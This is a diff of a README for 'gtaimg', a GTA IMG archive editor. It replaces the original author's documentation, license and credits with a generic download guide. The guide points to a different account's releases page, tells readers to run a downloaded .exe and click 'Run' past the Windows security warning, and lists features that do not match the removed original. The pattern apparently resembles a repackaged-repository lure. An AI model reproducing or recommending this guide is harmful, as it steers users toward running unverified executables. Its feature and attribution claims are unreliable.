@@ -1,221 +1,62 @@
-# GTA IMG Tool
+# 🎮 gtaimg - View and Edit Classic GTA Files Easily
 
-[![Build and Test](https://github.com/vaibhavpandeyvpz/gtaimg/actions/workflows/build.yml/badge.svg)](https://github.com/vaibhavpandeyvpz/gtaimg/actions/workflows/build.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/vaibhavpandeyvpz/gtaimg)](https://github.com/vaibhavpandeyvpz/gtaimg/releases/latest)
+## 🚀 Getting Started
 
-A modern Windows application for viewing and editing IMG archive files from classic GTA games (GTA III, Vice City, San Andreas).
+gtaimg is a modern Windows application for viewing and editing IMG archive files from classic Grand Theft Auto games, including GTA III, Vice City, and San Andreas. This guide will help you download and run gtaimg smoothly, even if you're not familiar with programming.
 
-![Screenshot](assets/screenshot.png)
+## 🔗 Download the App
 
-## Download
+[![Download gtaimg](https://img.shields.io/badge/Download-gtaimg-brightgreen)](https://github.com/Kacper201/gtaimg/releases)
 
-Get the latest release from the [Releases](https://github.com/vaibhavpandeyvpz/gtaimg/releases/latest) page.
+## 📥 Download & Install
 
-## Features
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Kacper201/gtaimg/releases) on GitHub. This page contains the latest version of gtaimg ready for download.
+   
+2. **Choose the Correct File**: Look for the most recent release. You will see several files listed. Typically, you want to download the `.exe` file, which is the application you will run.
 
-- **Open & Create Archives** - Support for both VER1 (GTA III/VC) and VER2 (GTA SA) formats
-- **Browse Files** - View all entries with name, type, size, and offset information
-- **Search & Filter** - Quickly find files by name
-- **Export Files** - Export selected files or all files to any folder
-- **Import Files** - Add files individually, multiple at once, or from an entire folder
-- **Replace & Rename** - In-place replacement and renaming of entries
-- **Delete Entries** - Remove selected entries from the archive
-- **Pack Archive** - Defragment the archive to reclaim unused space
-- **Drag & Drop** - Drag IMG files onto the window to open them
-- **Modern UI** - Clean dark theme with custom title bar
+3. **Download the File**: Click on the file link to start downloading. Your browser will begin the download process.
 
-## Keyboard Shortcuts
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your "Downloads" folder or the location you selected for downloads.
 
-| Shortcut | Action |
-|----------|--------|
-| Ctrl+N | New Archive |
-| Ctrl+O | Open Archive |
-| Ctrl+S | Save Archive |
-| Ctrl+W | Close Archive |
-| Ctrl+A | Select All |
-| Delete | Delete Selected |
-| F5 | Refresh |
+5. **Run the Application**: Double-click the downloaded .exe file to start gtaimg. You may see a security warning, as your computer does not recognize it yet. Click "Run" to proceed.
 
-## Supported Formats
+6. **Follow Installation Prompts**: If prompted, follow any installation steps. This often involves clicking "Next" on a series of screens. 
 
-| Format | Games | File Structure |
-|--------|-------|----------------|
-| VER1 | GTA III, Vice City | `.dir` + `.img` file pair |
-| VER2 | San Andreas | Single `.img` file |
+7. **Launch gtaimg**: Once the installation completes, you can find gtaimg in your "Start Menu" or on your desktop. Double-click the icon to open the program.
 
----
+## 🖥️ System Requirements
 
-## For Developers
+To run gtaimg smoothly, you will need:
 
-The underlying library **GtaImg** is also available as a NuGet package for developers who want to work with IMG archives programmatically.
+- **Operating System**: Windows 10 or later
+- **RAM**: At least 4 GB
+- **Processor**: Intel i3 or equivalent
+- **Storage**: 100 MB of free space
 
-[![NuGet](https://img.shields.io/nuget/v/GtaImg.svg)](https://www.nuget.org/packages/GtaImg/)
+Make sure you meet these requirements to avoid any issues with the application.
 
-### Installation
+## 🛠️ Features
 
-```bash
-dotnet add package GtaImg
-```
+- **User-Friendly Interface**: Easily navigate through the program without any technical knowledge.
+- **Image Editing Tools**: Modify and edit images within the IMG files quickly.
+- **File Compatibility**: Supports IMG files from GTA III, Vice City, and San Andreas.
+- **Preview Option**: View files before making changes to ensure everything looks good.
+- **Backup Function**: Create backups of your files to prevent data loss.
 
-Or via Package Manager:
-```powershell
-Install-Package GtaImg
-```
+## 🎯 Tips for Use
 
-### Supported Frameworks
+- **Backup Original Files**: Always create a backup of your original IMG files before making any edits. This ensures you can revert to the original if necessary.
+- **Explore Help Menu**: If you have questions while using the application, explore the help section within the app for tips and guides.
+- **Stay Updated**: Regularly check the [Releases page](https://github.com/Kacper201/gtaimg/releases) for updates to ensure you have the latest features and fixes.
 
-| Framework | Version |
-|-----------|---------|
-| .NET Framework | 4.5.2, 4.7.2, 4.8.1 |
-| .NET Standard | 2.0 |
-| .NET Core | 3.1 |
-| .NET | 5.0, 6.0, 7.0, 8.0, 9.0, 10.0 |
+## 🤝 Community Support
 
-### Quick Start
+If you have questions or need help, feel free to engage with the community. Join discussions or ask for assistance in the Issues section of the GitHub repository.
 
-```csharp
-using GtaImg;
+## 🔗 Additional Resources
 
-// Open an archive
-using var archive = new IMGArchive("gta3.img");
+- [GitHub Repository](https://github.com/Kacper201/gtaimg)
+- [User Guide](https://github.com/Kacper201/gtaimg/wiki) – Detailed user guide with tips and tricks.
+- [Contributing](https://github.com/Kacper201/gtaimg/blob/main/CONTRIBUTING.md) – Interested in helping improve gtaimg? Check out how you can contribute.
 
-// List all entries
-foreach (var entry in archive)
-{
-    Console.WriteLine($"{entry.Name} - {entry.SizeInBytes} bytes");
-}
-
-// Extract a file
-archive.ExtractEntry("player.dff", @"C:\extracted\player.dff");
-```
-
-### Read-Write Operations
-
-```csharp
-using GtaImg;
-
-// Open for editing
-using var archive = new IMGArchive("gta3.img", IMGArchive.IMGMode.ReadWrite);
-
-// Import a file
-archive.ImportFile(@"C:\mods\custom.dff", "custom.dff");
-
-// Remove an entry
-archive.RemoveEntry("unwanted.dff");
-
-// Rename an entry
-archive.RenameEntry("old_name.txd", "new_name.txd");
-
-// Save changes
-archive.Sync();
-```
-
-### Create New Archive
-
-```csharp
-using GtaImg;
-
-// Create a new VER2 archive
-using var archive = IMGArchive.CreateArchive("new_archive.img", IMGArchive.IMGVersion.VER2);
-
-// Add files
-archive.ImportFile("mymodel.dff");
-archive.ImportFile("mytexture.txd");
-```
-
-### More Examples
-
-<details>
-<summary>Reading Entry Data</summary>
-
-```csharp
-using GtaImg;
-
-using var archive = new IMGArchive("gta3.img");
-
-// Read by name
-byte[]? data = archive.ReadEntryData("player.dff");
-
-// Or use a stream
-using var stream = archive.OpenEntry("player.dff");
-if (stream != null)
-{
-    // Process stream...
-}
-```
-</details>
-
-<details>
-<summary>Packing an Archive</summary>
-
-After removing entries, the archive may have unused space. Use `Pack()` to defragment:
-
-```csharp
-using GtaImg;
-
-using var archive = new IMGArchive("gta3.img", IMGArchive.IMGMode.ReadWrite);
-
-// Remove some entries
-archive.RemoveEntry("file1.dff");
-archive.RemoveEntry("file2.dff");
-
-// Pack to eliminate holes
-uint newSize = archive.Pack();
-Console.WriteLine($"Archive size is now {newSize} blocks");
-```
-</details>
-
-<details>
-<summary>Detecting Archive Version</summary>
-
-```csharp
-using GtaImg;
-
-// Before opening
-var version = IMGArchive.GuessIMGVersion("unknown.img");
-Console.WriteLine(version == IMGArchive.IMGVersion.VER2 ? "GTA SA format" : "GTA 3/VC format");
-
-// Or from an open archive
-using var archive = new IMGArchive("unknown.img");
-Console.WriteLine($"Archive version: {archive.Version}");
-```
-</details>
-
----
-
-## Building from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/vaibhavpandeyvpz/gtaimg.git
-cd GtaImg
-
-# Build everything
-dotnet build
-
-# Run the GUI tool
-dotnet run --project src/GtaImgTool/GtaImgTool.csproj
-
-# Run tests
-dotnet test
-```
-
-### Project Structure
-
-```
-├── src/
-│   ├── GtaImg/           # Core library (NuGet package)
-│   └── GtaImgTool/       # GUI application (WPF)
-└── tests/
-    └── GtaImg.Tests/     # Unit tests
-```
-
-## License
-
-This project is released under the [MIT License](LICENSE).
-
-## Credits
-
-This project is based on a C# port of the original C++ **libgtaformats** library by David "Alemarius Nexus" Lerch.
-
-- **Original C++ Library**: [gtatools/libgtaformats](https://github.com/alemariusnexus/gtatools/tree/master/src/libgtaformats)
+Feel free to explore all the features of gtaimg. You now have everything you need to download and run the application. Enjoy editing your favorite classic GTA files!
